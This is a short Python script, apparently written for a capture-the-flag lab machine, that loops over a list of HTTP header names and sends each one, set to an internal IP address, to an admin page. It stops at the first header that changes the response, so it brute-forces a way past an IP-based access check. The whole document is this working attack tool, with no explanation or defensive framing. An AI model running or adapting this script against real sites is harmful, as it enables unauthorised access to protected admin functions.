#!/usr/bin/env python3

from urllib import request

url = "http://10.10.10.167/admin.php"

with open('./heads') as f:
    for l in f:
        head = l.strip('\n')
        headers = {head:"192.168.4.28"}
        req = request.Request(url, headers=headers)
        resp = request.urlopen(req).read().decode()
        if len(resp) != 89:
            print("We got something with: {}".format(head))
            break
        print("Trying with {}".format(head))
